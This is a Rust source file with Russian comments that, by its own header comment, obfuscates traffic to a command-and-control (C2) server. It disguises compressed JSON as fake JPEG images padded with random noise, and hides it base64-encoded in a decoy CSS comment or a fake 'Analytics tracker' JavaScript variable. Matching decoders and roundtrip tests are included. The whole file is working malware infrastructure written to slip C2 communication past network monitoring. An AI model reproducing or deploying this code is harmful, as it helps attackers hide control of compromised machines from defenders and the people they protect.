// обфускация трафика к c2
use anyhow::{Result, anyhow};
use flate2::Compression;
use flate2::write::ZlibEncoder;
use flate2::read::ZlibDecoder;
use std::io::{Write, Read};
use base64::{Engine as _, engine::general_purpose};

// формат передачи данных
#[derive(Debug, Clone, Copy)]
pub enum ObfuscationFormat {
    Json,
    Image,
    CSS,
    JS,
}

impl ObfuscationFormat {
    pub fn query_param(&self) -> &str {
        match self {
            Self::Json => "json",
            Self::Image => "image",
            Self::CSS => "css",
            Self::JS => "js",
        }
    }

    pub fn content_type(&self) -> &str {
        match self {
            Self::Json => "application/json",
            Self::Image => "image/jpeg",
            Self::CSS => "text/css",
            Self::JS => "application/javascript",
        }
    }
}

const JPEG_HEADER: &[u8] = &[0xFF, 0xD8, 0xFF, 0xE0];
const PNG_HEADER: &[u8] = &[0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
const GIF_HEADER: &[u8] = b"GIF89a";

// упаковываем json как поддельная картинка
pub fn encode_as_image(json: &str) -> Result<Vec<u8>> {
    // сжимаем
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(json.as_bytes())?;
    let compressed = encoder.finish()?;

    let mut result = Vec::new();

    // заголовок jpeg
    result.extend_from_slice(JPEG_HEADER);

    // длина данных (4 байта, big-endian)
    let length = compressed.len() as u32;
    result.extend_from_slice(&length.to_be_bytes());

    result.extend_from_slice(&compressed);

    // рандомный шум, чтоб выглядело как настоящее изображение
    let noise_size = rand::random::<usize>() % 1536 + 512;
    let noise: Vec<u8> = (0..noise_size).map(|_| rand::random()).collect();
    result.extend_from_slice(&noise);

    Ok(result)
}

// декодируем обратно из поддельной картинки
pub fn decode_from_image(data: &[u8]) -> Result<String> {
    // определяем тип по заголовку
    let header_len = if data.starts_with(JPEG_HEADER) {
        4
    } else if data.starts_with(PNG_HEADER) {
        8
    } else if data.starts_with(GIF_HEADER) {
        6
    } else {
        return Err(anyhow!("Invalid image header"));
    };

    if data.len() < header_len + 4 {
        return Err(anyhow!("Data too short"));
    }

    // читаем длину
    let length_bytes = &data[header_len..header_len + 4];
    let length = u32::from_be_bytes([
        length_bytes[0],
        length_bytes[1],
        length_bytes[2],
        length_bytes[3],
    ]) as usize;

    let compressed_start = header_len + 4;
    let compressed_end = compressed_start + length;

    if data.len() < compressed_end {
        return Err(anyhow!("Compressed data truncated"));
    }

    let compressed = &data[compressed_start..compressed_end];

    // разжимаем
    let mut decoder = ZlibDecoder::new(compressed);
    let mut json = String::new();
    decoder.read_to_string(&mut json)?;

    Ok(json)
}

// прячем данные в css комментарий
pub fn encode_as_css(json: &str) -> Result<Vec<u8>> {
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(json.as_bytes())?;
    let compressed = encoder.finish()?;
    let encoded = general_purpose::STANDARD.encode(&compressed);

    let css = format!(
        "/* Stylesheet v1.0 */\nbody {{ margin: 0; padding: 0; }}\n/* {} */\n.container {{ width: 100%; }}\n",
        encoded
    );

    Ok(css.into_bytes())
}

// достаём из css комментария
pub fn decode_from_css(data: &[u8]) -> Result<String> {
    let css = String::from_utf8(data.to_vec())?;

    let re = regex::Regex::new(r"/\*\s*([A-Za-z0-9+/=]+)\s*\*/")?;

    if let Some(caps) = re.captures(&css) {
        let encoded = &caps[1];
        let compressed = general_purpose::STANDARD.decode(encoded)?;

        let mut decoder = ZlibDecoder::new(&compressed[..]);
        let mut json = String::new();
        decoder.read_to_string(&mut json)?;

        Ok(json)
    } else {
        Err(anyhow!("No data found in CSS"))
    }
}

// прячем данные в js переменную
pub fn encode_as_js(json: &str) -> Result<Vec<u8>> {
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(json.as_bytes())?;
    let compressed = encoder.finish()?;
    let encoded = general_purpose::STANDARD.encode(&compressed);

    let js = format!(
        "// Analytics tracker v2.1\nvar _config = '{}';\nfunction track() {{ return true; }}\n",
        encoded
    );

    Ok(js.into_bytes())
}

// достаём из js переменной
pub fn decode_from_js(data: &[u8]) -> Result<String> {
    let js = String::from_utf8(data.to_vec())?;

    let re = regex::Regex::new(r"var\s+_config\s*=\s*'([A-Za-z0-9+/=]+)'")?;

    if let Some(caps) = re.captures(&js) {
        let encoded = &caps[1];
        let compressed = general_purpose::STANDARD.decode(encoded)?;

        let mut decoder = ZlibDecoder::new(&compressed[..]);
        let mut json = String::new();
        decoder.read_to_string(&mut json)?;

        Ok(json)
    } else {
        Err(anyhow!("No data found in JS"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_image_roundtrip() {
        let json = r#"{"success":true,"files":[]}"#;
        let encoded = encode_as_image(json).unwrap();
        let decoded = decode_from_image(&encoded).unwrap();
        assert_eq!(json, decoded);
    }

    #[test]
    fn test_css_roundtrip() {
        let json = r#"{"success":true,"files":[]}"#;
        let encoded = encode_as_css(json).unwrap();
        let decoded = decode_from_css(&encoded).unwrap();
        assert_eq!(json, decoded);
    }

    #[test]
    fn test_js_roundtrip() {
        let json = r#"{"success":true,"files":[]}"#;
        let encoded = encode_as_js(json).unwrap();
        let decoded = decode_from_js(&encoded).unwrap();
        assert_eq!(json, decoded);
    }
}
